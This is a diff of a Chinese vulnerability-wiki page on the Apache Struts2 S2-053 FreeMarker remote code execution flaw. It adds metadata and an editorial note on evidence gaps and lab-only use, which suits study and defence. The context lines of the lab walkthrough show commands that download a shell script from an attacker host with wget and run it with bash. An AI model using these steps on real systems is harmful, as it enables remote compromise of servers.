@@ -1,8 +1,53 @@
 ---
 source: "Threekiii/Vulnerability-Wiki"
+title: "Apache Struts2 S2-053 远程代码执行漏洞"
+product: "Apache Struts2 FreeMarker标签集成"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "S2-053"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "受控值进入非字面量FreeMarker标签属性再OGNL求值；声明分支范围需官方核对"
+source_status: "unknown"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
+id: "vw-d9b3cbc03bf1f779bfaff8bd"
+entity_id: "ve-d9b3cbc03bf1f779bfaff8bd"
+schema_version: "1"
 ---
 
 # Apache Struts2 S2-053 远程代码执行漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：受控值进入非字面量FreeMarker标签属性再OGNL求值；声明分支范围需官方核对
+- 证据范围：双层求值描述方向正确但没有展示危险模板，只有表单payload和图片。
+
+### 本次正文校订
+
+- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 不是只要使用FreeMarker就漏洞，需给模板属性/输入绑定条件
+- Struts2.5范围止2.5.10待核，缺对应修复/CVE
+- 变成离开一个表达式为文字损坏；末尾换行必要性未解释
+- 上传/执行shell payload全部仅图片，缺实际请求和状态证据
+- 清空安全排除集合/文件持久副作用未说明
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ## 漏洞描述
 
@@ -19,7 +64,7 @@ source: "Threekiii/Vulnerability-Wiki"
 
 Vulhub 执行以下命令启动 s2-053 测试环境：
 
-```
+```shell
 docker-compose build
 docker-compose up -d
 ```
@@ -51,7 +96,7 @@ python3环境下：python -m http.server 80
 
 上传 shell.sh 文件的命令为：
 
-```
+```shell
 wget 192.168.174.128/shell.sh
 ```
 
@@ -62,7 +107,7 @@ wget 192.168.174.128/shell.sh
 
 执行 shell.sh 文件的命令为：
 
-```
+```shell
 bash shell.sh
 ```
 
